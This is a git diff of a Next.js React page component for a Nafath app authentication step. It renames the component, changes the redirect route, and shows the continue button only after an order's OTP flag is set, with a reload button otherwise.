@@ -2,10 +2,10 @@ import { FaArrowRightLong } from 'react-icons/fa6'
 import { useRouter, useSearchParams } from 'next/navigation'
 
 import Link from 'next/link'
-import { use, useCallback, useEffect, useState } from 'react'
+import { useCallback, useEffect, useState } from 'react'
 import SwiperSlider from '@/components/SwiperSlider'
 
-const Nafat = () => {
+const NafatOtpOne = () => {
   const router = useRouter()
   const params = useSearchParams()
   const _id = params.get('id')
@@ -16,7 +16,7 @@ const Nafat = () => {
   const handleSubmit = (e) => {
     e.preventDefault()
     router.push({
-      pathname: '/profession',
+      pathname: '/address',
       query: { id: params.get('id') },
     })
   }
@@ -46,6 +46,10 @@ const Nafat = () => {
 
     return () => clearInterval(timer)
   }, [fetchOrder])
+
+  const reload = () => {
+    window.location.reload()
+  }
 
   return (
     <>
@@ -84,18 +88,27 @@ const Nafat = () => {
         >
           OPEN NAFATH APP
         </Link>
-        <form onSubmit={handleSubmit} className="w-3/4 my-14">
+        {order.nafatOtpOne ? (
+          <form onSubmit={handleSubmit} className="w-3/4 my-14">
+            <button
+              type="submit"
+              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            >
+              Continue To Profession <FaArrowRightLong size={16} />
+            </button>
+          </form>
+        ) : (
           <button
-            type="submit"
-            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            onClick={reload}
+            className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
           >
-            Continue To Profession <FaArrowRightLong size={16} />
+            Reload Page
           </button>
-        </form>
+        )}
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
   )
 }
 
-export default Nafat
+export default NafatOtpOne
